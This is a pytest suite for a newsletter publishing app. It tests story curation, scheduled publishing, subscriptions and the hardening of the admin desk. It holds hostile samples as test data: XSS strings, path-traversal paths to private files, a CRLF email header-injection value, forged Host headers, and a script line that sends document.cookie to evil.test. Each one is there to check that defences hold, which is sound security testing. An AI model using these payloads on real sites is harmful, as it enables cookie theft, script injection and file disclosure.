import http.client
import json
import socket
import socketserver
import threading
import time
from datetime import datetime, timezone
from functools import partial
from http.server import ThreadingHTTPServer
from types import SimpleNamespace

import pytest

from pipeline import db, desk as dk, mailer, server

D = "2026-11-06"
NOW = datetime(2026, 11, 5, 15, 0, tzinfo=timezone.utc)


def add(news, n, status="new", title=None, summary="A summary of this story, long enough to keep.", published="2026-11-05T06:00:00Z", category="AI", image=None):
    news.execute("INSERT INTO articles (id, canonical_url, source, category, source_weight, title, summary, image_url, published_at, fetched_at, status, score) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                 (f"a{n}", f"https://x.test/{n}", "TechCrunch", category, 5, title or f"Story {n}", summary, image, published, "2026-11-05T06:00:00Z", status, 100 - n))


def pick(news, *ns):
    news.execute("DELETE FROM selections")
    for rank, n in enumerate(ns):
        news.execute("UPDATE articles SET status='selected_prime' WHERE id=?", (f"a{n}",))
        news.execute("INSERT INTO selections (slot, rank, article_id) VALUES ('prime',?,?)", (rank, f"a{n}"))


class Box:
    def __init__(self):
        self.sent = []

    def send(self, msg):
        self.sent.append(msg)

    def close(self):
        pass


@pytest.fixture
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("BOUGHT_DATA", str(tmp_path / "data"))
    monkeypatch.setenv("BOUGHT_OUT", str(tmp_path / "out"))
    monkeypatch.setenv("BOUGHT_PUBLIC", str(tmp_path / "public"))
    monkeypatch.setenv("BOUGHT_ADMIN_PASSWORD", "correct horse")
    (tmp_path / "public").mkdir()
    (tmp_path / "public" / "index.html").write_text("the paper")
    (tmp_path / "data").mkdir()
    (tmp_path / "data" / "secret.txt").write_text("private")
    news = db.connect(tmp_path / "data" / "news.db")
    for n in range(1, 7):
        add(news, n)
    pick(news, 1, 2, 3)
    desk = dk.connect()
    dk.save_settings(desk, {"publish_time": "07:00", "publish_zone": "IST", "reader_hours": "0"})   # the times below are written for 07:00 IST
    return SimpleNamespace(news=news, desk=desk, tmp=tmp_path)


def test_the_rules_picks_are_chosen_and_the_rest_are_left(env):
    b = dk.board(env.news, env.desk, D)
    assert [s["id"] for s in b["chosen"]] == ["a1", "a2", "a3"]
    assert [s["id"] for s in b["left"]] == ["a4", "a5", "a6"]


def test_decisions_move_stories_and_survive_a_new_selection(env):
    dk.decide(env.news, env.desk, "a1", "ignore", D, NOW)
    dk.decide(env.news, env.desk, "a2", "tomorrow", D, NOW)
    dk.decide(env.news, env.desk, "a4", "today", D, NOW)
    pick(env.news, 2, 3, 5)                    # an intake runs and the rules choose again
    b = dk.board(env.news, env.desk, D)
    assert [s["id"] for s in b["chosen"]] == ["a3", "a5", "a4"]
    assert [s["id"] for s in b["tomorrow"]] == ["a2"]
    assert [s["id"] for s in b["ignored"]] == ["a1"]
    assert "a1" not in [s["id"] for s in b["left"]]


def test_a_story_held_for_tomorrow_runs_tomorrow_even_if_it_has_expired(env):
    dk.decide(env.news, env.desk, "a4", "tomorrow", D, NOW)
    env.news.execute("UPDATE articles SET status='expired' WHERE id='a4'")
    assert "a4" not in [s["id"] for s in dk.board(env.news, env.desk, D)["chosen"]]
    assert "a4" in [s["id"] for s in dk.board(env.news, env.desk, dk.add_days(D, 1))["chosen"]]


def test_ignored_can_be_brought_back(env):
    dk.decide(env.news, env.desk, "a1", "ignore", D, NOW)
    dk.decide(env.news, env.desk, "a1", "today", D, NOW)
    assert "a1" in [s["id"] for s in dk.board(env.news, env.desk, D)["chosen"]]
    assert env.news.execute("SELECT status FROM articles WHERE id='a1'").fetchone()[0] == "new"


def test_the_finalized_list_does_not_move_when_news_comes_in(env):
    dk.finalize(env.news, env.desk, D, NOW)
    pick(env.news, 4, 5, 6)
    assert dk.final_list(env.desk, D) == ["a1", "a2", "a3"]
    with pytest.raises(PermissionError):
        dk.decide(env.news, env.desk, "a1", "ignore", D, NOW)


def test_published_stories_cannot_run_again_tomorrow(env):
    dk.finalize(env.news, env.desk, D, NOW)
    dk.click_publish(env.news, env.desk, D, NOW)
    tomorrow = dk.board(env.news, env.desk, dk.add_days(D, 1))
    assert not {"a1", "a2", "a3"} & {s["id"] for s in tomorrow["chosen"] + tomorrow["left"]}


def test_reopening_gives_the_stories_back(env):
    dk.finalize(env.news, env.desk, D, NOW)
    dk.back_to_review(env.news, env.desk, D)
    assert dk.stage(env.desk, D) == "review"
    with pytest.raises(PermissionError):
        dk.click_publish(env.news, env.desk, D, NOW)


def test_settings_refuse_bad_values_and_time_zones_count(env):
    with pytest.raises(ValueError):
        dk.save_settings(env.desk, {"publish_time": "25:00"})
    with pytest.raises(ValueError):
        dk.save_settings(env.desk, {"auto_fetch_minutes": "1"})
    with pytest.raises(ValueError):
        dk.save_settings(env.desk, {"site_url": "javascript:alert(1)"})
    dk.save_settings(env.desk, {"publish_time": "05:30", "publish_zone": "UTC"})
    assert dk.due_at(D, dk.get_settings(env.desk)) == datetime(2026, 11, 6, 5, 30, tzinfo=timezone.utc)
    dk.save_settings(env.desk, {"publish_time": "07:00", "publish_zone": "IST"})
    assert dk.due_at(D, dk.get_settings(env.desk)) == datetime(2026, 11, 6, 1, 30, tzinfo=timezone.utc)


# ---------- the whole journey, with a stand-in for the video build ----------

def app_for(env, clock):
    def runner(kind, issue, log_path):
        log_path.write_text("ok")
        if kind == "prepare":
            base = env.tmp / "out" / "issues" / issue
            (base / "media").mkdir(parents=True, exist_ok=True)
            ids = dk.final_list(dk.connect(), issue)
            items = [{"id": i, "headline": f"Headline {i}", "summary": "A summary of this story, long enough to keep.", "source": "TechCrunch", "category": "AI", "link": f"https://x.test/{i}", "image_url": None, "image_credit": None} for i in ids]
            (base / "feed.json").write_text(json.dumps({"generated_at": "2026-11-05T10:00:00Z", "prime": items, "cards": [], "glance": []}))
        return SimpleNamespace(poll=lambda: 0)
    box = Box()
    app = server.App(config=None, runner=runner, box=box, clock=clock)
    app.cfg = lambda: SimpleNamespace(user_agent="t", translate_languages=())
    app.sources = lambda: [SimpleNamespace(name="TechCrunch"), SimpleNamespace(name="Wired")]
    app.busy = lambda: False                       # this machine's load must not decide a test
    return app, box


def publish_flow(env, app):
    dk.save_settings(env.desk, {"site_url": "https://bought.test"})
    dk.finalize(env.news, env.desk, D, NOW)
    dk.click_publish(env.news, env.desk, D, NOW)
    app.start_job("prepare", D)
    app.tick()


def test_it_waits_for_the_time_then_goes_live_and_emails_once(env, monkeypatch):
    from pipeline.funnel import publish as fp
    monkeypatch.setattr(fp, "unique_items", fp.unique_items)
    times = [NOW]
    app, box = app_for(env, lambda: times[0])
    monkeypatch.setattr(app, "put_live", lambda desk, date: fp.publish(app.cfg(), date, env.news, 2, out_root=env.tmp / "out", public_root=env.tmp / "public", build_share=False))
    for addr in ("a@x.test", "b@x.test"):
        mailer.subscribe(env.desk, addr, NOW)
    mailer.confirm(env.desk, env.desk.execute("SELECT token FROM subscribers WHERE email='a@x.test'").fetchone()[0], NOW)
    publish_flow(env, app)
    assert dk.stage(env.desk, D) == "ready"
    assert not (env.tmp / "public" / "issues" / D).exists()      # not on the site before its time
    box.sent.clear()                                             # confirmation mail is not the issue

    dk.set_issue(env.desk, D, held=1)
    times[0] = datetime(2026, 11, 6, 2, 0, tzinfo=timezone.utc)
    app.tick()
    assert dk.stage(env.desk, D) == "ready"                      # held past its time: still waits
    dk.set_issue(env.desk, D, held=0)
    app.tick()
    assert dk.stage(env.desk, D) == "live"
    assert json.loads((env.tmp / "public/issues/index.json").read_text())["latest"] == D
    issue_mails = [m for m in box.sent if "unsubscribe" in m.get_body(("plain",)).get_content().lower()]
    assert [m["To"] for m in issue_mails] == ["a@x.test"]        # the unconfirmed address gets no issue
    assert issue_mails[0]["List-Unsubscribe"].startswith("<https://bought.test/unsubscribe?t=")
    count = len(box.sent)
    app.send_emails(env.desk, D)
    app.tick()
    assert len(box.sent) == count                                # nobody gets it twice


def test_a_failed_build_can_be_retried_and_does_not_go_live(env):
    app, box = app_for(env, lambda: NOW)
    app.runner = lambda kind, issue, path: SimpleNamespace(poll=lambda: 1)
    publish_flow(env, app)
    assert dk.stage(env.desk, D) == "failed"
    dk.click_publish(env.news, env.desk, D, NOW)
    assert dk.stage(env.desk, D) == "building"


def test_only_one_job_runs_at_a_time(env):
    app, _ = app_for(env, lambda: NOW)
    app.runner = lambda kind, issue, path: SimpleNamespace(poll=lambda: None)
    assert app.start_job("intake")
    assert not app.start_job("intake")


def test_a_restart_during_a_build_is_shown_and_retryable(env):
    app, _ = app_for(env, lambda: NOW)
    app.runner = lambda kind, issue, path: SimpleNamespace(poll=lambda: None)
    publish_flow(env, app)
    server.App(runner=app.runner, box=Box(), clock=lambda: NOW)
    assert dk.stage(env.desk, D) == "failed"


# ---------- subscribing ----------

def test_addresses_are_checked():
    for bad in ("", "nope", "a@b", "a b@c.com", "a@b.com\r\nBcc: x@y.com", "<a@b.com>"):
        with pytest.raises(ValueError):
            mailer.clean_email(bad)
    assert mailer.clean_email(" You@Company.COM ") == "you@company.com"


def test_leaving_means_no_more_mail_and_coming_back_needs_a_new_confirmation(env):
    s = mailer.subscribe(env.desk, "a@x.test", NOW)
    assert s["status"] == "pending"
    assert not mailer.unsubscribe(env.desk, "wrong-token", NOW)
    mailer.confirm(env.desk, s["token"], NOW)
    assert mailer.subscribe(env.desk, "a@x.test", NOW)["status"] == "confirmed"
    mailer.unsubscribe(env.desk, s["token"], NOW)
    assert mailer.subscribe(env.desk, "a@x.test", NOW)["status"] == "pending"


def test_a_bad_address_does_not_stop_the_rest(env):
    class Flaky(Box):
        def send(self, msg):
            if msg["To"] == "bad@x.test":
                raise OSError("refused")
            super().send(msg)
    for a in ("bad@x.test", "good@x.test"):
        s = mailer.subscribe(env.desk, a, NOW)
        mailer.confirm(env.desk, s["token"], NOW)
    page = {"issue": D, "stories": [{"uid": "u", "t": "Headline <b>", "sz": "lead", "cat": "AI", "dek": "", "src": ["Wired", "https://x.test"]}]}
    box = Flaky()
    assert mailer.send_issue(env.desk, page, "https://b.test", NOW, box=box) == {"sent": 1, "failed": 1}
    assert "Headline &lt;b&gt;" in box.sent[0].get_body(("html",)).get_content()
    assert mailer.send_issue(env.desk, page, "https://b.test", NOW, box=box) == {"sent": 0, "failed": 1}   # only the failure is retried


def test_real_smtp_conversation():
    got = []

    class Sink(socketserver.StreamRequestHandler):
        def handle(self):
            self.wfile.write(b"220 sink\r\n")
            data = False
            for raw in self.rfile:
                line = raw.decode().rstrip("\r\n")
                if data:
                    if line == ".":
                        data = False
                        self.wfile.write(b"250 ok\r\n")
                    else:
                        got.append(line)
                elif line.upper().startswith("DATA"):
                    data = True
                    self.wfile.write(b"354 go\r\n")
                elif line.upper().startswith("QUIT"):
                    self.wfile.write(b"221 bye\r\n")
                    return
                else:
                    self.wfile.write(b"250 ok\r\n")
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sink)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    box = mailer.Mailbox({"host": "127.0.0.1", "port": srv.server_address[1], "user": "", "password": "", "from": "Bought. <issue@x.test>"})
    box.send(mailer.confirmation_message("a@x.test", "tok", "https://b.test"))
    box.close()
    srv.shutdown()
    text = "\n".join(got)
    assert "To: a@x.test" in text and "From: Bought. <issue@x.test>" in text and "confirm?t=3Dtok" in text.replace("=\n", "")


def test_a_password_is_not_sent_without_encryption():
    class Sink(socketserver.StreamRequestHandler):
        def handle(self):
            self.wfile.write(b"220 sink\r\n")
            for raw in self.rfile:
                self.wfile.write(b"221 bye\r\n" if raw.upper().startswith(b"QUIT") else b"250 ok\r\n")
                if raw.upper().startswith(b"QUIT") or raw.upper().startswith(b"AUTH"):
                    assert not raw.upper().startswith(b"AUTH")
                    return
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sink)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    box = mailer.Mailbox({"host": "127.0.0.1", "port": srv.server_address[1], "user": "u", "password": "p", "from": "x@x.test"})
    with pytest.raises(RuntimeError):
        box.send(mailer.confirmation_message("a@x.test", "t", "https://b.test"))
    srv.shutdown()


# ---------- the web side ----------

@pytest.fixture
def web(env):
    app, box = app_for(env, lambda: NOW)
    server.Handler.app = app
    srv = ThreadingHTTPServer(("127.0.0.1", 0), partial(server.Handler, directory=str(env.tmp / "public")))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]

    def call(method, path, body=None, cookie=None, origin=True, ctype="application/x-www-form-urlencoded", ip=None):
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        h = {"Content-Type": ctype}
        if cookie:
            h["Cookie"] = cookie
        if origin and method == "POST":
            h["Origin"] = f"http://127.0.0.1:{port}"
        if ip:
            h["X-Real-IP"] = ip
        c.request(method, path, body, h)
        r = c.getresponse()
        data = r.read().decode(errors="replace")
        c.close()
        return SimpleNamespace(status=r.status, text=data, headers=r.headers)

    def login():
        r = call("POST", "/admin/login", "password=correct+horse")
        assert r.status == 303
        return r.headers["Set-Cookie"].split(";")[0]
    yield SimpleNamespace(call=call, login=login, app=app, box=box, env=env, port=port)
    srv.shutdown()


def test_nothing_in_admin_opens_without_the_password(web):
    for path in ("/admin", "/admin/", "/admin/review", "/admin/final", "/admin/email", "/admin/settings", "/admin/log?job=1", "/admin/email/preview"):
        r = web.call("GET", path)
        assert r.status == 303 and r.headers["Location"] == "/admin/login", path
    for path in ("/admin/publish", "/admin/finalize", "/admin/api/decide", "/admin/settings", "/admin/fetch", "/admin/publish-now"):
        assert web.call("POST", path, "date=" + D).status == 401, path
    assert web.call("GET", "/admin", cookie="bought_admin=9999999999.forged").status == 303
    assert dk.stage(web.env.desk, D) == "review"


def test_wrong_passwords_are_refused_then_locked_out(web):
    for _ in range(5):
        assert web.call("POST", "/admin/login", "password=nope", ip="9.9.9.9").status == 401
    assert web.call("POST", "/admin/login", "password=correct+horse", ip="9.9.9.9").status == 429


def test_the_session_cookie_is_locked_down(web):
    r = web.call("POST", "/admin/login", "password=correct+horse")
    cookie = r.headers["Set-Cookie"]
    assert "HttpOnly" in cookie and "SameSite=Strict" in cookie and "Path=/admin" in cookie


def test_another_site_cannot_press_the_buttons(web):
    cookie = web.login()
    assert web.call("POST", "/admin/finalize", "date=" + D, cookie=cookie, origin=False).status == 403
    assert dk.stage(web.env.desk, D) == "review"


def test_feed_text_cannot_run_in_the_admin_page(web):
    add(web.env.news, 9, title="<script>alert(1)</script>Evil", summary="<img src=x onerror=alert(2)> and enough words here to keep")
    web.env.news.execute("UPDATE articles SET canonical_url='javascript:alert(3)' WHERE id='a9'")
    html = web.call("GET", "/admin/review?date=" + D, cookie=web.login()).text
    assert "<script>alert(1)" not in html and "<img src=x" not in html and "javascript:alert(3)" not in html
    assert "&lt;script&gt;alert(1)" in html


def test_the_whole_desk_over_http(web):
    cookie = web.login()
    assert "Issue of" in web.call("GET", "/admin", cookie=cookie).text
    r = web.call("POST", "/admin/api/decide", json.dumps({"id": "a4", "action": "today", "date": D}), cookie=cookie, ctype="application/json")
    assert r.status == 200 and json.loads(r.text)["ok"]
    assert web.call("POST", "/admin/api/decide", json.dumps({"id": "nope", "action": "today", "date": D}), cookie=cookie, ctype="application/json").status == 400
    assert web.call("POST", "/admin/finalize", "date=" + D, cookie=cookie).status == 303
    final = web.call("GET", "/admin/final?date=" + D, cookie=cookie).text
    assert "Publish these 4 stories" in final and "Story 4" in final
    assert web.call("GET", "/admin/review?date=" + D, cookie=cookie).status == 303      # the list is closed
    assert web.call("POST", "/admin/publish", "date=" + D, cookie=cookie).status == 303
    web.app.tick()
    assert dk.stage(web.env.desk, D) == "ready"
    assert "Goes live at" in web.call("GET", "/admin/final?date=" + D, cookie=cookie).text


def test_subscribing_from_the_site(web):
    bad = web.call("POST", "/api/subscribe", json.dumps({"email": "nope"}), ctype="application/json", ip="1.1.1.1")
    assert bad.status == 400
    first = web.call("POST", "/api/subscribe", json.dumps({"email": "a@x.test"}), ctype="application/json", ip="1.1.1.1")
    again = web.call("POST", "/api/subscribe", json.dumps({"email": "a@x.test"}), ctype="application/json", ip="1.1.1.1")
    assert first.status == 200 and first.text == again.text                            # can't be used to see who subscribes
    token = web.env.desk.execute("SELECT token FROM subscribers").fetchone()[0]
    assert web.call("GET", f"/confirm?t={token}").status == 200                        # a mail scanner opening the link
    assert web.env.desk.execute("SELECT status FROM subscribers").fetchone()[0] == "pending"
    assert "You're subscribed" in web.call("POST", f"/confirm?t={token}", "").text
    assert web.env.desk.execute("SELECT status FROM subscribers").fetchone()[0] == "confirmed"
    assert "unsubscribed" in web.call("POST", f"/unsubscribe?t={token}", "List-Unsubscribe=One-Click").text
    assert web.call("POST", "/api/subscribe", json.dumps({"email": "b@x.test"}), ctype="application/json", origin=False, ip="1.1.1.2").status == 200
    for _ in range(6):
        last = web.call("POST", "/api/subscribe", json.dumps({"email": "c@x.test"}), ctype="application/json", ip="7.7.7.7")
    assert last.status == 429


def test_private_files_are_not_served(web):
    assert web.call("GET", "/").text == "the paper"
    for path in ("/../data/secret.txt", "/..%2fdata%2fsecret.txt", "/data/secret.txt", "/../data/admin_session_key", "/%2e%2e/data/secret.txt"):
        assert "private" not in web.call("GET", path).text, path


def test_ad_ids_cannot_reach_other_backend_paths():
    from pipeline.server import quote_id
    good = "c83fccdd-df06-4566-9cfc-3d12be1935b8"
    assert quote_id(good) == good
    for bad in ("../../cron", "x", "", None, good + "/review", "../admin/queue-aaaaaaaaaaaaaaaaaaaaaaaa"):
        assert quote_id(bad) == "invalid"


def test_ads_page_escapes_what_an_advertiser_typed():
    from pipeline import admin_pages as pages
    ad = {"id": "c83fccdd-df06-4566-9cfc-3d12be1935b8", "spot": "top", "kind": "video", "state": "review", "advertiser": "<script>x</script>",
          "fields": {"line": "<img src=x onerror=alert(1)>", "web": "javascript:alert(1)"}, "transcript_english": "<b>hi</b>"}
    html = pages.ad_card(ad)
    assert "<script>x" not in html and "<img src=x" not in html and "<b>hi" not in html
    assert "javascript:" not in html


def test_ads_page_names_what_is_missing_and_never_values():
    from pipeline import admin_pages as pages
    common = dict(date="2026-11-06", stage="review", settings={}, row=None, job=None, now=None, message="", error="")
    html = pages.ads_page(running=True, status={"live": False, "missing": ["MUX_TOKEN_ID"], "providers": {}}, queue={}, **common)
    assert "MUX_TOKEN_ID" in html and "simulation" in html
    assert "not running" in pages.ads_page(running=False, status={}, queue={}, **common)


def _get(web, path, **headers):
    c = http.client.HTTPConnection("127.0.0.1", web.port, timeout=10)
    c.request("GET", path, headers=headers)
    r = c.getresponse()
    body = r.read()
    c.close()
    return r, body


def test_site_files_are_gzipped_cached_and_checked(web):
    import gzip
    pub = web.env.tmp / "public"
    (pub / "js").mkdir(exist_ok=True)
    (pub / "js" / "app.js").write_text("let x = 1;\n" * 400)
    r, body = _get(web, "/js/app.js?v=10", **{"Accept-Encoding": "gzip, br"})
    assert r.status == 200 and r.headers["Content-Encoding"] == "gzip" and r.headers["Vary"] == "Accept-Encoding"
    assert gzip.decompress(body).decode() == "let x = 1;\n" * 400 and len(body) < 400
    assert r.headers["Cache-Control"] == "public, max-age=31536000, immutable"
    assert r.headers["X-Content-Type-Options"] == "nosniff" and "camera=(self)" in r.headers["Permissions-Policy"]
    again, _ = _get(web, "/js/app.js?v=10", **{"Accept-Encoding": "gzip", "If-None-Match": r.headers["ETag"]})
    assert again.status == 304
    plain, body = _get(web, "/js/app.js")
    assert plain.status == 200 and "Content-Encoding" not in plain.headers and body.decode().startswith("let x")
    assert plain.headers["Cache-Control"] == "no-cache"


def test_cache_rules():
    from pipeline.server import cache_policy
    assert cache_policy("/styles.css", "v=10").endswith("immutable")
    assert cache_policy("/js/live/c-YL55G6O3.js", "").endswith("immutable")
    assert cache_policy("/fonts/f1.woff2", "").endswith("immutable")
    assert cache_policy("/js/live/client.js", "") == "no-cache"
    assert cache_policy("/", "") == "no-cache" and cache_policy("/issues/index.json", "") == "no-cache"
    assert cache_policy("/issues/2026-11-05/issue.json", "") == "no-cache"
    assert cache_policy("/issues/2026-11-05/media/a.mp4", "") == "public, max-age=3600"


def test_folders_are_never_listed_and_admin_answers_are_never_cached(web):
    pub = web.env.tmp / "public"
    (pub / "issues" / "x").mkdir(parents=True, exist_ok=True)
    (pub / "issues" / "x" / "secret-name.mp4").write_bytes(b"0" * 10)
    r, body = _get(web, "/issues/x/")
    assert r.status == 404 and b"secret-name" not in body
    assert web.call("GET", "/admin/login").headers["Cache-Control"] == "no-store"
    assert web.call("HEAD", "/admin").status == 405


def test_health_check_for_an_uptime_monitor(web, monkeypatch):
    for answer, ads in (((0, {}), "down"), ((200, {"live": False}), "simulated"), ((200, {"live": True}), "live")):
        monkeypatch.setattr(web.app, "backend_call", lambda *a, answer=answer: answer)
        r = web.call("GET", "/healthz")
        assert r.status == 200 and json.loads(r.text) == {"ok": True, "ads": ads}
    assert r.headers["Cache-Control"] == "no-store"


def test_video_ranges_still_work_with_gzip_accepted(web):
    pub = web.env.tmp / "public"
    (pub / "v.mp4").write_bytes(bytes(range(256)) * 8)
    r, body = _get(web, "/v.mp4", Range="bytes=10-19", **{"Accept-Encoding": "gzip"})
    assert r.status == 206 and body == bytes(range(10, 20)) and "Content-Encoding" not in r.headers
    assert r.headers.get_all("Accept-Ranges") == ["bytes"]


def test_the_paper_goes_out_at_six_utc_by_default():
    assert dk.DEFAULTS["publish_time"] == "06:00" and dk.DEFAULTS["publish_zone"] == "UTC"
    assert dk.due_at("2026-11-06", dk.DEFAULTS) == datetime(2026, 11, 6, 6, 0, tzinfo=timezone.utc)


def test_reader_hours_hold_background_work_until_the_morning_rush_passes():
    s = {**dk.DEFAULTS, "reader_hours": "4"}
    at = lambda h, m=0: datetime(2026, 11, 6, h, m, tzinfo=timezone.utc)
    assert not dk.in_reader_hours(at(5, 59), s)
    assert dk.in_reader_hours(at(6, 0), s) and dk.in_reader_hours(at(9, 59), s)
    assert not dk.in_reader_hours(at(10, 0), s) and not dk.in_reader_hours(at(23, 0), s)
    late = {**s, "publish_time": "22:00", "reader_hours": "6"}            # a rush that crosses midnight
    assert dk.in_reader_hours(at(1, 0), late) and not dk.in_reader_hours(at(4, 0), late)
    assert not dk.in_reader_hours(at(6, 30), {**s, "reader_hours": "0"})
    with pytest.raises(ValueError):
        dk.save_settings(dk.connect(), {"reader_hours": "30"})


def test_automatic_fetching_waits_for_reader_hours_and_a_quiet_machine(env):
    times = [datetime(2026, 11, 6, 7, 0, tzinfo=timezone.utc)]
    started = []
    app, _ = app_for(env, lambda: times[0])
    app.runner = lambda kind, issue, path: started.append(kind) or SimpleNamespace(poll=lambda: None)
    dk.save_settings(env.desk, {"publish_time": "06:00", "publish_zone": "UTC", "reader_hours": "4", "auto_fetch_minutes": "60"})
    app.tick()
    assert started == []                                   # 07:00 UTC: readers' hours
    times[0] = datetime(2026, 11, 6, 10, 30, tzinfo=timezone.utc)
    app.busy = lambda: True
    app.tick()
    assert started == []                                   # past the rush, but the machine is busy
    app.busy = lambda: False
    app.tick()
    assert started == ["intake"]
    assert app.start_job("prepare", D) is False            # one job at a time


def test_a_burst_of_readers_is_queued_not_refused(env):
    from concurrent.futures import ThreadPoolExecutor
    srv = server.Server(("127.0.0.1", 0), partial(server.Handler, directory=str(env.tmp / "public")))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]

    def get(_):
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=20)
        try:
            c.request("GET", "/")
            return c.getresponse().status
        finally:
            c.close()
    with ThreadPoolExecutor(100) as pool:          # under macOS's own cap of 128; Linux allows 4096
        codes = list(pool.map(get, range(300)))
    srv.shutdown()
    assert codes.count(200) == 300


# ---------- the public address has no desk; the desk is private, code-protected and answers only to its own names ----------
@pytest.fixture
def public(env, web):
    srv = server.Server(("127.0.0.1", 0), partial(server.PublicHandler, directory=str(env.tmp / "public")))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]

    def call(method, path, body=None, headers=None):
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        c.request(method, path, body, {"Content-Type": "application/x-www-form-urlencoded", "Origin": f"http://127.0.0.1:{port}", **(headers or {})})
        r = c.getresponse()
        data = r.read().decode(errors="replace")
        c.close()
        return SimpleNamespace(status=r.status, text=data, headers=r.headers)
    yield SimpleNamespace(call=call, port=port)
    srv.shutdown()


def test_the_public_address_has_no_desk_at_all(public):
    for path in ("/admin", "/admin/", "/admin/login", "/admin/ads", "/admin/settings", "/admin/log?job=1"):
        r = public.call("GET", path)
        assert r.status == 404 and "password" not in r.text.lower(), path
    for path in ("/admin/login", "/admin/publish", "/admin/settings", "/admin/api/decide"):
        assert public.call("POST", path, "password=correct+horse").status == 404, path
    assert public.call("HEAD", "/admin").status == 405


def test_public_health_check_says_nothing_more_than_up(public):
    r = public.call("GET", "/healthz")
    assert json.loads(r.text) == {"ok": True}


def test_no_software_names_in_answers(public, web):
    for r in (public.call("GET", "/"), web.call("GET", "/admin/login")):
        assert r.headers["Server"] == "Bought", r.headers["Server"]


def test_the_page_gets_a_strict_content_security_policy(public, env):
    csp = public.call("GET", "/").headers["Content-Security-Policy"]
    assert "script-src 'self' 'wasm-unsafe-eval' https://checkout.razorpay.com;" in csp
    assert "object-src 'none'" in csp and "frame-ancestors 'self'" in csp and "'unsafe-eval'" not in csp.replace("wasm-unsafe-eval", "")
    assert "upgrade-insecure-requests" not in csp
    assert "upgrade-insecure-requests" in public.call("GET", "/", headers={"X-Forwarded-Proto": "https"}).headers["Content-Security-Policy"]


def test_share_pages_may_run_only_their_own_redirect(public, env):
    from pipeline import security as sec
    share = env.tmp / "public" / "s" / "abc"
    share.mkdir(parents=True)
    good, evil = 'location.replace("../../#s-2026-11-05-abc");', "fetch('https://evil.test/'+document.cookie)"
    (share / "index.html").write_text(f"<!doctype html><title>t</title><script>{good}</script><script>{evil}</script>")
    csp = public.call("GET", "/s/abc/").headers["Content-Security-Policy"]
    assert sec.script_hash(good) in csp and sec.script_hash(evil) not in csp


def test_the_site_policy_names_only_a_real_supabase_address():
    from pipeline import security as sec
    assert "https://abc.supabase.co" in sec.site_csp("https://abc.supabase.co", True) and "wss://abc.supabase.co" in sec.site_csp("https://abc.supabase.co", True)
    for bad in ("https://x.co; script-src *", "http://plain.test", "javascript:alert(1)", None):
        csp = sec.site_csp(bad, True)
        assert "script-src *" not in csp and "plain.test" not in csp and "javascript" not in csp


def test_the_desk_refuses_other_host_names(web):
    c = http.client.HTTPConnection("127.0.0.1", web.port, timeout=10)
    c.request("GET", "/admin/login", headers={"Host": "attacker.example"})
    r = c.getresponse()
    assert r.status == 421 and b"Password" not in r.read()
    c.close()
    c = http.client.HTTPConnection("127.0.0.1", web.port, timeout=10)
    c.request("POST", "/admin/login", "password=correct+horse", {"Host": f"rebind.example:{web.port}", "Origin": f"http://rebind.example:{web.port}", "Content-Type": "application/x-www-form-urlencoded"})
    assert c.getresponse().status == 421
    c.close()


def test_desk_host_names_from_settings():
    from pipeline import security as sec
    hosts = sec.desk_hosts(8100, "bought-vps.tail1234.ts.net, desk.internal:443")
    assert {"localhost:8100", "127.0.0.1:8100", "bought-vps.tail1234.ts.net", "bought-vps.tail1234.ts.net:8100", "desk.internal:443"} <= hosts
    assert "desk.internal" not in hosts and "evil.test:8100" not in hosts


def test_desk_sign_in_needs_password_and_a_fresh_code(web):
    from pipeline import security as sec
    secret = sec.new_totp_secret()
    web.app.codes = sec.CodeCheck(secret)
    assert 'name="code"' in web.call("GET", "/admin/login").text
    now_code = sec.totp(secret, int(time.time() // 30))
    assert web.call("POST", "/admin/login", "password=correct+horse").status == 401                     # no code
    assert web.call("POST", "/admin/login", "password=correct+horse&code=000000" if now_code != "000000" else "password=correct+horse&code=111111").status == 401
    assert web.call("POST", "/admin/login", f"password=wrong&code={now_code}").status == 401             # right code, wrong password
    web.app.codes = sec.CodeCheck(secret)                                                                # (the try above used the code up)
    r = web.call("POST", "/admin/login", f"password=correct+horse&code={now_code}")
    assert r.status == 303 and "bought_admin=" in r.headers["Set-Cookie"]
    assert web.call("POST", "/admin/login", f"password=correct+horse&code={now_code}").status == 401     # the same code can't be used twice


def test_desk_sign_in_from_another_site_is_refused(web):
    r = web.call("POST", "/admin/login", "password=correct+horse", origin=False)
    assert r.status == 403


def test_codes_match_the_published_test_vectors():
    from pipeline import security as sec
    secret = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"            # RFC 6238 appendix B, SHA-1
    for t, expected in ((59, "287082"), (1111111109, "081804"), (1234567890, "005924"), (2000000000, "279037")):
        assert sec.totp(secret, t // 30) == expected
    check = sec.CodeCheck(secret)
    assert check.verify("287 082", now=59) and not check.verify("287082", now=59)
    assert not sec.CodeCheck(secret).verify("287082", now=59 + 120)      # four minutes late
